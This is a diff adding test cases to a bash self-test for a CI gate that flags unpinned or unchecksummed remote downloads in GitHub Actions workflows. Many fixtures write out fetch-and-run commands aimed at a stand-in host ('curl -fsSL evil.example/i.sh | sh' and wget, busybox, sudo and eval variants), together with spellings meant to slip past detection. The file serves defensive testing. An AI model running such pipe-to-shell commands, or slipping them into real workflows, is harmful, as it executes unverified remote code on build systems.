@@ -367,5 +367,257 @@ mkdir -p "$T/binary"; printf 'jobs:\n  j:\n    steps:\n      - run: \x00\xff\xfe
 if bash "$GATE" "$T/binary" >/dev/null 2>&1; then xrc=0; else xrc=$?; fi; ok=0; [[ $xrc == 0 || $xrc == 1 ]] || ok=1; check "odd bytes do not crash the gate (rc is a verdict, not an awk error)" "$ok"
 
 
+# ============ PS-A3 (review round 2): default-refuse; every fixture is a table cell ============
+# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one shape the round-2 review reproduced)
+E=https://evil.example/i.sh
+for spec in \
+  "r2_bare_host|curl -fsSL evil.example/i.sh | sh" \
+  "r2_docker|curl get.docker.com | sh" \
+  "r2_upper_scheme|curl -fsSL HTTPS://evil.example/i.sh | sh" \
+  "r2_ftp|curl -fsSL ftp://evil.example/i.sh | sh" \
+  "r2_wget_bare|wget -qO- evil.example/i.sh | sh" \
+  "r2_command_curl|command curl -fsSL $E | sh" \
+  "r2_backslash_curl|\\curl -fsSL $E | sh" \
+  "r2_busybox|busybox wget -O- $E | sh" \
+  "r2_sudo_curl|sudo -E curl -fsSL $E | sh" \
+  "r2_envassign|X=1 curl -fsSL $E | sh" \
+  "r2_if_curl|if curl -fsSL $E | sh; then echo ok; fi" \
+  "r2_glued_o|curl -sSLo/tmp/i.sh $E && sh /tmp/i.sh" \
+  "r2_glued_o2|curl -o/tmp/i.sh $E && sh /tmp/i.sh" \
+  "r2_cluster_O|curl -fsSLO $E && sh i.sh" \
+  "r2_long_eq|curl --output=i.sh $E && sh i.sh" \
+  "r2_long_sp|curl --output i.sh $E && sh i.sh" \
+  "r2_remote_name|curl --remote-name $E && sh i.sh" \
+  "r2_remote_name_all|curl --remote-name-all $E && sh i.sh" \
+  "r2_wget_default|wget $E && sh i.sh" \
+  "r2_wget_Ofile|wget -O i.sh $E && sh i.sh" \
+  "r2_wget_Oglued|wget -qOi.sh $E && sh i.sh" \
+  "r2_append|curl -sSf $E >> i.sh; sh i.sh" \
+  "r2_tar|curl -sSfL https://example.invalid/t.tgz | tar xz -C /usr/local" \
+  "r2_o_dash_pipe|curl -sSfo- $E | sh" \
+  "r2_post_pipe|curl -sSf -X POST -d x $E | sh" \
+  "r2_unknown_sink|curl -sSfL $E | mystery-tool" \
+  "r2_xargs|curl -sSfL $E | xargs sh -c" ; do
+  fixture "${spec%%|*}" "${spec#*|}"
+done
+for c in r2_bare_host r2_docker r2_upper_scheme r2_ftp r2_wget_bare r2_command_curl r2_backslash_curl r2_busybox r2_sudo_curl r2_envassign r2_if_curl r2_o_dash_pipe r2_post_pipe r2_unknown_sink r2_xargs; do bad "$c" 5 "consumed in-stream"; done
+for c in r2_glued_o r2_glued_o2 r2_cluster_O r2_long_eq r2_long_sp r2_remote_name r2_remote_name_all r2_wget_default r2_wget_Ofile r2_wget_Oglued r2_append; do bad "$c" 5 "no checksum verification in the step"; done
+bad r2_tar 5 "no checksum verification in the step"
+# a file target through the tar/tee sink class is "file": no checksum -> finding text is the file one
+fixture r2_tee "curl -sSfL $E | tee /tmp/x"; bad r2_tee 5 "no checksum verification in the step"
+fixture r2_tar_file "curl -sSfL https://example.invalid/t.tgz | tar xz"; bad r2_tar_file 5 "no checksum verification in the step"
+# the same glued/odd spellings against a GitHub ref and a bare host, and a host in other case
+for spec in \
+  "r2_gh_upper_host|curl -fsSL RAW.githubusercontent.com/o/r/main/i.sh | sh" \
+  "r2_gh_upper_scheme|curl -fsSL HTTPS://Raw.GitHubUserContent.com/o/r/main/i.sh | sh" \
+  "r2_gh_glued|curl -sSLo/tmp/i.sh https://raw.githubusercontent.com/o/r/main/i.sh" \
+  "r2_api_ref_qs|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh?ref=main\\&x=$SHA | sh" \
+  "r2_api_sha_owner|curl -fsSL https://api.github.com/repos/o/$SHA/tarball/main -o a.tgz" \
+  "r2_api_repo_sha|curl -fsSL https://api.github.com/repos/$SHA/r/tarball/main -o a.tgz" \
+  "r2_api_contents_noref|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh -o i.sh" \
+  "r2_api_commits_branch|curl -fsSL https://api.github.com/repos/o/r/commits/main -o c.json" \
+  "r2_api_trees_branch|curl -fsSL https://api.github.com/repos/o/r/git/trees/main -o c.json" \
+  "r2_api_tarball_noref|curl -fsSL https://api.github.com/repos/o/r/tarball -o a.tgz" ; do
+  fixture "${spec%%|*}" "${spec#*|}"
+done
+for c in r2_gh_upper_host r2_gh_upper_scheme r2_gh_glued r2_api_ref_qs r2_api_sha_owner r2_api_repo_sha r2_api_contents_noref r2_api_commits_branch r2_api_trees_branch r2_api_tarball_noref; do bad "$c" 5 "mutable GitHub ref"; done
+for spec in \
+  "r2_shape_filesha|curl -fsSL -o i.sh https://github.com/o/r/x/main/$SHA/i.sh" \
+  "r2_shape_owner_sha|curl -fsSL -o i.sh https://github.com/$SHA/r/x/main/i.sh" \
+  "r2_shape_other_host|curl -fsSL -o i.sh https://objects.githubusercontent.com/o/r/$SHA/i.sh" \
+  "r2_shape_pulls_file|curl -fsSL https://api.github.com/repos/o/r/pulls/1 -o p.json" \
+  "r2_shape_pulls_sh|curl -fsSL https://api.github.com/repos/o/r/pulls/1 | sh" \
+  "r2_shape_releases_tag|curl -fsSL -o i.sh https://github.com/o/r/releases/tag/v1" ; do
+  fixture "${spec%%|*}" "${spec#*|}"
+done
+for c in r2_shape_filesha r2_shape_owner_sha r2_shape_other_host r2_shape_pulls_file r2_shape_pulls_sh r2_shape_releases_tag; do bad "$c" 5 "unrecognised GitHub URL shape"; done
+fixture r2_nourl_pipe "curl -fsSL -K cfg | sh"; bad r2_nourl_pipe 5 "cannot verify what is fetched"
+fixture r2_nourl_file "curl -fsSL -K cfg -o x"; bad r2_nourl_file 5 "cannot verify what is fetched"
+# sha in ITS position stays ok, in every shape, and with a 40-hex owner too
+for spec in \
+  "r2_ok_contents_ref|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh?ref=$SHA | sh" \
+  "r2_ok_commits|curl -fsSL https://api.github.com/repos/o/r/commits/$SHA -o c.json" \
+  "r2_ok_trees|curl -fsSL https://api.github.com/repos/o/r/git/trees/$SHA -o t.json" \
+  "r2_ok_zipball|curl -fsSL https://api.github.com/repos/$SHA/r/zipball/$SHA -o z.zip" \
+  "r2_ok_upper_sha|curl -fsSL RAW.githubusercontent.com/o/r/$SHA/i.sh | sh" \
+  "r2_ok_gh_tarball|curl -fsSL https://github.com/o/r/tarball/$SHA -o t.tgz" \
+  "r2_ok_o_dash|curl -sSfo- https://example.invalid/healthz" \
+  "r2_ok_o_dash2|curl -sSf -o - https://example.invalid/healthz | jq ." \
+  "r2_ok_wget_stdout2|wget -q -O - https://example.invalid/healthz" \
+  "r2_ok_wget_longout|wget --output-document=- https://example.invalid/healthz" \
+  "r2_ok_sum_glued|curl -sSLo/tmp/b https://example.invalid/b && sha256sum -c b.sum" \
+  "r2_ok_apt_curl|apt-get install -y curl wget" \
+  "r2_ok_command_v|if ! command -v curl >/dev/null; then echo no; fi" \
+  "r2_ok_which|which curl" \
+  "r2_ok_echo|echo curl is needed" \
+  "r2_ok_version|curl --version | head -n 1" \
+  "r2_ok_discard_w|curl -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/ready" \
+  "r2_ok_discard_redir|curl -sf https://example.invalid/ready > /dev/null" \
+  "r2_ok_discard_redir2|curl -s -f http://127.0.0.1:8080/ready >/dev/null 2>&1" \
+  "r2_ok_head|curl --head https://example.invalid/x.tgz" \
+  "r2_ok_head_I|curl -sSfI https://example.invalid/x.tgz" \
+  "r2_ok_discard_gh|curl -sSf -o /dev/null https://raw.githubusercontent.com/o/r/main/i.sh" \
+  "r2_ok_post|curl -sSf -X POST -d '{\"a\":1}' \"\$SOME_URL\"" \
+  "r2_ok_post_data|curl -sSf --data-binary @payload.json https://example.invalid/hook" \
+  "r2_ok_post_form|curl -sSf -F f=@x.log \$HOOK_URL" \
+  "r2_ok_upload|curl -sSf -T report.txt https://example.invalid/up" \
+  "r2_ok_api_print|curl -sSf https://api.github.com/repos/o/r/pulls/1" \
+  "r2_ok_api_jq|curl -sSf https://api.github.com/repos/o/r/pulls/1 | jq -r .title" \
+  "r2_ok_api_grep_head|curl -sSf https://api.github.com/repos/o/r/pulls/1 | grep state | head -n 1" \
+  "r2_ok_api_assign|V=\$(curl -sSf https://api.github.com/repos/o/r/releases/latest | jq -r .tag_name)" \
+  "r2_ok_var_print|curl -sSf \"\$URL\"" \
+  "r2_ok_wget_spider|wget -q --spider https://example.invalid/x" ; do
+  fixture "${spec%%|*}" "${spec#*|}"
+done
+for c in r2_ok_contents_ref r2_ok_commits r2_ok_trees r2_ok_zipball r2_ok_upper_sha r2_ok_gh_tarball r2_ok_o_dash r2_ok_o_dash2 r2_ok_wget_stdout2 r2_ok_wget_longout r2_ok_sum_glued \
+         r2_ok_apt_curl r2_ok_command_v r2_ok_which r2_ok_echo r2_ok_version r2_ok_discard_w r2_ok_discard_redir r2_ok_discard_redir2 r2_ok_head r2_ok_head_I r2_ok_discard_gh \
+         r2_ok_post r2_ok_post_data r2_ok_post_form r2_ok_upload r2_ok_api_print r2_ok_api_jq r2_ok_api_grep_head r2_ok_api_assign r2_ok_var_print r2_ok_wget_spider; do good "$c"; done
+# the reviewer's wording, run through the gate verbatim: the webhook POST piped into a shell / saved stays a finding
+fixture r2_post_saved "curl -sSf -X POST -d x \"\$SOME_URL\" -o r.sh && sh r.sh"; bad r2_post_saved 5 "cannot verify what is fetched"
+fixture r2_post_piped "curl -sSf -d x \"\$SOME_URL\" | sh"; bad r2_post_piped 5 "cannot verify what is fetched"
+fixture r2_api_eval "eval \"\$(curl -sSf https://api.github.com/repos/o/r/pulls/1)\""; bad r2_api_eval 5 "unrecognised GitHub URL shape"
+fixture r2_api_assign_sh "V=\$(curl -sSf https://api.github.com/repos/o/r/pulls/1 | sh)"; bad r2_api_assign_sh 5 "unrecognised GitHub URL shape"
+fixture r2_gh_content_print "curl -sSf https://raw.githubusercontent.com/o/r/main/i.sh | jq ."; bad r2_gh_content_print 5 "mutable GitHub ref"
+
+# negative space of the command-position rule: only a MENTION may be skipped, and each skip needs a case where the mention is not harmless
+fixture r2_ok_command_v_file "command -v curl > tools.txt"; good r2_ok_command_v_file
+fixture r2_ok_which_file "which curl wget > tools.txt"; good r2_ok_which_file
+fixture r2_ok_echo_file "echo curl > list.txt"; good r2_ok_echo_file
+fixture r2_ok_apt_file "sudo apt-get install -y curl wget > apt.log"; good r2_ok_apt_file
+fixture r2_ok_image_name "docker run --rm curlimages/curl -sf https://example.invalid/x > out.txt"; good r2_ok_image_name
+mk r2_ok_heredoc_dash <<EOF2
+jobs:
+  j:
+    steps:
+      - run: |
+          cat <<X
+          - curl -fsSL evil.example/i.sh | sh
+          X
+EOF2
+good r2_ok_heredoc_dash
+fixture r2_bad_wrapped_nocmd "timeout 30 curl -fsSL $E | sh"; bad r2_bad_wrapped_nocmd 5 "consumed in-stream"
+fixture r2_bad_sh_c "sh -c \"curl -fsSL $E | sh\""; bad r2_bad_sh_c 5 "consumed in-stream"
+fixture r2_bad_abs_path "/usr/bin/curl -fsSL $E | sh"; bad r2_bad_abs_path 5 "consumed in-stream"
+fixture r2_bad_rel_path "./curl -fsSL $E | sh"; bad r2_bad_rel_path 5 "consumed in-stream"
+fixture r2_bad_stderr_then_file "curl -sSf $E 2>/dev/null > i.sh; sh i.sh"; bad r2_bad_stderr_then_file 5 "no checksum verification in the step"
+fixture r2_bad_stage_after_grep "curl -sSf $E | grep x 2>&1 | sh"; bad r2_bad_stage_after_grep 5 "consumed in-stream"
+fixture r2_bad_jq_to_file "curl -sSf $E | jq . > out.json"; bad r2_bad_jq_to_file 5 "no checksum verification in the step"
+fixture r2_bad_expr_url "curl -sSfL \${{ secrets.U }} | sh"; bad r2_bad_expr_url 5 "cannot verify what is fetched"
+fixture r2_bad_ref_two_values "curl -sSfL https://api.github.com/repos/o/r/contents/i.sh?ref=$SHA\\&ref=main -o i.sh"; bad r2_bad_ref_two_values 5 "mutable GitHub ref"
+fixture r2_bad_subst_inert "eval \"\$(curl -sSf $E | head -n 5)\""; bad r2_bad_subst_inert 5 "consumed in-stream"
+fixture r2_bad_wget_stdout_glued "wget -qO- evil.example/i.sh > i.sh; sh i.sh"; bad r2_bad_wget_stdout_glued 5 "no checksum verification in the step"
+
+# scope decisions: composite actions are read; a shell the gate cannot read is a finding
+mkdir -p "$T/act_bad/workflows" "$T/act_bad/actions/setup" "$T/act_ok/workflows" "$T/act_ok/actions/setup"
+printf 'jobs:\n  j:\n    steps:\n      - run: echo fine\n' | tee "$T/act_bad/workflows/w.yaml" > "$T/act_ok/workflows/w.yaml"
+printf 'runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -sSfL %s | sh\n' "$M" > "$T/act_bad/actions/setup/action.yml"
+printf 'runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -sSfL https://raw.githubusercontent.com/o/r/%s/i.sh | sh\n' "$SHA" > "$T/act_ok/actions/setup/action.yml"
+composite_action_case() {
+  local o rc; o="$(bash "$GATE" "$T/act_bad/workflows" 2>&1)"; rc=$?
+  [[ $rc == 1 ]] && grep -qF "action.yml:5:" <<<"$o" && grep -qF "mutable GitHub ref" <<<"$o"; check "actions dir: an unpinned fetch in a composite action fails naming action.yml:5" $?
+}
+composite_action_case
+bash "$GATE" "$T/act_ok/workflows" >/dev/null 2>&1; check "actions dir: a pinned composite action passes" $?
+mk sh_pwsh <<EOF2
+jobs:
+  j:
+    steps:
+      - name: x
+        shell: pwsh
+        run: echo hi
+EOF2
+bad sh_pwsh 6 "unsupported shell, cannot verify"
+mk sh_python_after <<EOF2
+jobs:
+  j:
+    steps:
+      - run: echo hi
+        shell: python
+EOF2
+bad sh_python_after 4 "unsupported shell, cannot verify"
+mk sh_expr <<'EOF2'
+jobs:
+  j:
+    steps:
+      - shell: ${{ matrix.shell }}
+        run: echo hi
+EOF2
+bad sh_expr 5 "unsupported shell, cannot verify"
+mk sh_defaults <<EOF2
+defaults:
+  run:
+    shell: pwsh
+jobs:
+  j:
+    steps:
+      - run: echo hi
+EOF2
+bad sh_defaults 3 "unsupported shell, cannot verify"
+mk sh_bash_ok <<EOF2
+defaults:
+  run:
+    shell: bash
+jobs:
+  j:
+    steps:
+      - shell: bash -e {0}
+        run: echo hi
+      - shell: sh
+        run: echo hi
+EOF2
+good sh_bash_ok
+
+# ============ PS-A4: one fixture per rule/branch/table cell that the mutation run showed was not pinned ============
+# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one rule: removing the rule must turn it red)
+RAW=https://raw.githubusercontent.com/o/r/main/i.sh
+for spec in \
+  "r3_echo_mention|echo curl $E | sh" \
+  "r3_hash_mention|hash curl $E | sh" \
+  "r3_apt_mention|apt install curl $E | sh" \
+  "r3_aptget_mention|apt-get install curl $E | sh" \
+  "r3_post_raw_X|curl -sf -X POST -d x $RAW" \
+  "r3_post_raw_request|curl -sf --request PUT $RAW" \
+  "r3_post_raw_d|curl -sf -d x $RAW" \
+  "r3_post_raw_T|curl -sf -T f $RAW" \
+  "r3_post_wget|wget -qO- --post-data=x $RAW" \
+  "r3_devnull_redir|curl -sf $RAW >/dev/null" \
+  "r3_head_I|curl -sfI $RAW" \
+  "r3_head_pipe_inert|curl -sSf $E | head -n 1" ; do
+  fixture "${spec%%|*}" "${spec#*|}"
+done
+for c in r3_echo_mention r3_hash_mention r3_apt_mention r3_aptget_mention r3_post_raw_X r3_post_raw_request r3_post_raw_d r3_post_raw_T r3_post_wget r3_devnull_redir r3_head_I r3_head_pipe_inert; do good "$c"; done
+for spec in \
+  "r3_get_raw|curl -sf -X GET $RAW|mutable GitHub ref" \
+  "r3_stderr_null|curl -sf $RAW 2>/dev/null|mutable GitHub ref" \
+  "r3_stderr_null_sp|curl -sf $RAW 2> /dev/null|mutable GitHub ref" \
+  "r3_url_opt|curl -sSf --url $E | sh|consumed in-stream" \
+  "r3_dollar_beside_pinned|curl -sSfL \"\$U\" https://raw.githubusercontent.com/o/r/$SHA/i.sh | sh|cannot verify" \
+  "r3_codeload_kind|curl -sSfL -o a.tgz https://codeload.github.com/o/r/foo/$SHA|unrecognised GitHub URL shape" \
+  "r3_codeload_noref|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz|unrecognised GitHub URL shape" \
+  "r3_api_orgs|curl -sSfL -o a.tgz https://api.github.com/orgs/o/x/tarball/$SHA|unrecognised GitHub URL shape" \
+  "r3_api_blobs|curl -sSfL -o a.json https://api.github.com/repos/o/r/git/blobs/$SHA|unrecognised GitHub URL shape" \
+  "r3_sum_word_x|curl -sSfL -o a $E && sha256sum a x|no checksum verification in the step" ; do
+  fixture "${spec%%|*}" "$(cut -d'|' -f2- <<<"$spec" | sed 's/|[^|]*$//')"
+  bad "${spec%%|*}" 5 "${spec##*|}"
+done
+fixture r3_unknown_first_word "5 echo curl $E | sh"; bad r3_unknown_first_word 5 "consumed in-stream"
+
+# MISSING TEST 1: an awk that fails must exit 3 with the message, never green
+awk_failure_case() {
+  local o rc
+  mkdir -p "$T/stubbin"; printf '#!/bin/sh\necho "awk: simulated failure" >&2\nexit 2\n' > "$T/stubbin/awk"; chmod +x "$T/stubbin/awk"
+  o="$(PATH="$T/stubbin:$PATH" bash "$GATE" "$REAL" 2>&1)"; rc=$?
+  [[ $rc == 3 ]] && grep -qF "INTERNAL ERROR -- no summary produced" <<<"$o"; check "a failing awk exits 3 with the internal-error message" $?
+}
+awk_failure_case
+rm -rf "$T/stubbin"
+
+# MISSING TEST 2: the loop-run cases must cover the fixtures declared (counted from the directories, not the loop)
+coverage_guard() {
+  local ndirs; ndirs="$(find "$T" -mindepth 1 -maxdepth 1 -type d | wc -l | tr -d ' ')"
+  if (( n < ndirs || n == 0 )); then echo "FAIL: ran $n case(s) for $ndirs fixture dir(s): a loop ran zero or too few cases" >&2; fail=$((fail+1)); fi
+}
+coverage_guard
+
 if (( fail )); then echo "template-workflow-pins selftest: $fail FAILED of $n case(s)" >&2; exit 1; fi
 echo "template-workflow-pins selftest: ok -- $n case(s)"
